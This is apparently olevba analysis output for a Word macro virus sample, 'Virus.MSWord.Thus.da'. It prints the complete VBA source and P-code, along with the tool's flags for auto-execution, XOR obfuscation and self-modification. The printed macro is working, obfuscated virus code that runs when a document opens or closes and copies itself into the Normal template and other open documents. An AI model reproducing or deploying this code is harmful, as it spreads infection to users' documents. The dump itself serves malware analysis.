olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.da
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.da - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Alina_001'
Dim s, a As Integer, n, ch
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) = "'Alina_001'" Then
For i = 60 To 87
    s = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    For n = 1 To Len(s)
        ch = Mid(s, n, 1)
        a = Asc(ch)
        Mid(s, n, 1) = Chr(a Xor 7)
    Next n
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
Next i
Else
For i = 60 To 87
    s = VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    For n = 1 To Len(s)
        ch = Mid(s, n, 1)
        a = Asc(ch)
        Mid(s, n, 1) = Chr(a Xor 7)
    Next n
    VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
    VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
Next i
End If
qqq
For k = 1 To Application.Documents.Count
If Mid(Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(60, 1), 1, 1) <> "'" Then
   For i = 60 To 87
       s = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
       For n = 1 To Len(s)
           ch = Mid(s, n, 1)
           a = Asc(ch)
           Mid(s, n, 1) = Chr(a Xor 7)
       Next n
       Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
       Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
   Next i
End If
Next k
If Mid(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(60, 1), 1, 1) <> "'" Then
   For i = 60 To 87
       s = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
       For n = 1 To Len(s)
           ch = Mid(s, n, 1)
           a = Asc(ch)
           Mid(s, n, 1) = Chr(a Xor 7)
       Next n
       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i
       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, s
   Next i
End If
End Sub
Private Sub Document_Close()
  Document_Open
End Sub
Private Sub qqq()
''''Hi'Buuhu'Ubtrjb'Ibs
''''Fwwkndfsnhi)Hwsnhit)QnurtWuhsbdsnhi':'Afktb
''''Na'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)Knibt/5+'6.';9'% FknifX776 %'Sobi
''''IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb'X
'''')CbkbsbKnibt'6+'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)DhrisHaKnibt
''''Bic'Na
''''Na'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt':'7'Sobi
''''IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb'X
'''')NitbusKnibt'6+'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)Knibt/6+'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist'X
'''')Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt.
''''Bic'Na
''''Na'IhujfkSbjwkfsb)Tfqbc':'Afktb'Sobi'IhujfkSbjwkfsb)Tfqb
''''Ahu'l':'6'Sh'Fwwkndfsnhi)Chdrjbist)Dhris
''''Na'Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)Knibt/5+'6.';9'% FknifX776 %'Sobi
''''Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)CbkbsbKnibt'6+'Fwwkndfsnhi)Chdrjbist)Nsbj/l.'X
'''')QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt
''''Bic'Na
''''Na'Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt':'7'Sobi
''''Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X
'''')DhcbJhcrkb)NitbusKnibt'6+'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist'X
'''')Nsbj/6.)DhcbJhcrkb)Knibt/6+'IhujfkSbjwkfsb)QEWuhmbds'X
'''')QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt.
''''Bic'Na
''''Ibs'l
'' Fknif+'~hr'f'ebfrsnarkbts'`nuk)'N'khqb'~hr)))
End Sub



























-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thus.da
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6963 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x000A "Alina_001'"
' Line #2:
' 	Dim 
' 	VarDefn s
' 	VarDefn a (As Integer)
' 	VarDefn n
' 	VarDefn ch
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "'Alina_001'"
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x003C 
' 	LitDI2 0x0057 
' 	For 
' Line #6:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #7:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #8:
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ch 
' Line #9:
' 	Ld ch 
' 	ArgsLd Asc 0x0001 
' 	St a 
' Line #10:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	Mid 
' Line #11:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #13:
' 	Ld i 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x003C 
' 	LitDI2 0x0057 
' 	For 
' Line #17:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #18:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #19:
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ch 
' Line #20:
' 	Ld ch 
' 	ArgsLd Asc 0x0001 
' 	St a 
' Line #21:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	Mid 
' Line #22:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #24:
' 	Ld i 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	ArgsCall qqq 0x0000 
' Line #28:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #29:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x003C 
' 	LitDI2 0x0057 
' 	For 
' Line #31:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #32:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #33:
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ch 
' Line #34:
' 	Ld ch 
' 	ArgsLd Asc 0x0001 
' 	St a 
' Line #35:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	Mid 
' Line #36:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #38:
' 	Ld i 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x003C 
' 	LitDI2 0x0057 
' 	For 
' Line #44:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #45:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #46:
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ch 
' Line #47:
' 	Ld ch 
' 	ArgsLd Asc 0x0001 
' 	St a 
' Line #48:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Ld s 
' 	Ld n 
' 	LitDI2 0x0001 
' 	Mid 
' Line #49:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #51:
' 	Ld i 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Private Sub Document_Close())
' Line #56:
' 	ArgsCall Document_Open 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub qqq())
' Line #59:
' 	QuoteRem 0x0000 0x0017 "'''Hi'Buuhu'Ubtrjb'Ibs"
' Line #60:
' 	QuoteRem 0x0000 0x002E "'''Fwwkndfsnhi)Hwsnhit)QnurtWuhsbdsnhi':'Afktb"
' Line #61:
' 	QuoteRem 0x0000 0x0060 "'''Na'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)Knibt/5+'6.';9'% FknifX776 %'Sobi"
' Line #62:
' 	QuoteRem 0x0000 0x003D "'''IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb'X"
' Line #63:
' 	QuoteRem 0x0000 0x0042 "''')CbkbsbKnibt'6+'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X"
' Line #64:
' 	QuoteRem 0x0000 0x001B "''')DhcbJhcrkb)DhrisHaKnibt"
' Line #65:
' 	QuoteRem 0x0000 0x0009 "'''Bic'Na"
' Line #66:
' 	QuoteRem 0x0000 0x0054 "'''Na'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt':'7'Sobi"
' Line #67:
' 	QuoteRem 0x0000 0x003D "'''IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb'X"
' Line #68:
' 	QuoteRem 0x0000 0x0042 "''')NitbusKnibt'6+'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X"
' Line #69:
' 	QuoteRem 0x0000 0x003F "''')DhcbJhcrkb)Knibt/6+'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist'X"
' Line #70:
' 	QuoteRem 0x0000 0x0024 "''')Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt."
' Line #71:
' 	QuoteRem 0x0000 0x0009 "'''Bic'Na"
' Line #72:
' 	QuoteRem 0x0000 0x003B "'''Na'IhujfkSbjwkfsb)Tfqbc':'Afktb'Sobi'IhujfkSbjwkfsb)Tfqb"
' Line #73:
' 	QuoteRem 0x0000 0x002B "'''Ahu'l':'6'Sh'Fwwkndfsnhi)Chdrjbist)Dhris"
' Line #74:
' 	QuoteRem 0x0000 0x006F "'''Na'Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)Knibt/5+'6.';9'% FknifX776 %'Sobi"
' Line #75:
' 	QuoteRem 0x0000 0x0041 "'''Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X"
' Line #76:
' 	QuoteRem 0x0000 0x003D "''')DhcbJhcrkb)CbkbsbKnibt'6+'Fwwkndfsnhi)Chdrjbist)Nsbj/l.'X"
' Line #77:
' 	QuoteRem 0x0000 0x003A "''')QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt"
' Line #78:
' 	QuoteRem 0x0000 0x0009 "'''Bic'Na"
' Line #79:
' 	QuoteRem 0x0000 0x0063 "'''Na'Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt':'7'Sobi"
' Line #80:
' 	QuoteRem 0x0000 0x0041 "'''Fwwkndfsnhi)Chdrjbist)Nsbj/l.)QEWuhmbds)QEDhjwhibist)Nsbj/6.'X"
' Line #81:
' 	QuoteRem 0x0000 0x0045 "''')DhcbJhcrkb)NitbusKnibt'6+'IhujfkSbjwkfsb)QEWuhmbds)QEDhjwhibist'X"
' Line #82:
' 	QuoteRem 0x0000 0x003A "''')Nsbj/6.)DhcbJhcrkb)Knibt/6+'IhujfkSbjwkfsb)QEWuhmbds'X"
' Line #83:
' 	QuoteRem 0x0000 0x0031 "''')QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)DhrisHaKnibt."
' Line #84:
' 	QuoteRem 0x0000 0x0009 "'''Bic'Na"
' Line #85:
' 	QuoteRem 0x0000 0x0009 "'''Ibs'l"
' Line #86:
' 	QuoteRem 0x0000 0x002F "' Fknif+'~hr'f'ebfrsnarkbts'`nuk)'N'khqb'~hr)))"
' Line #87:
' 	EndSub 
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

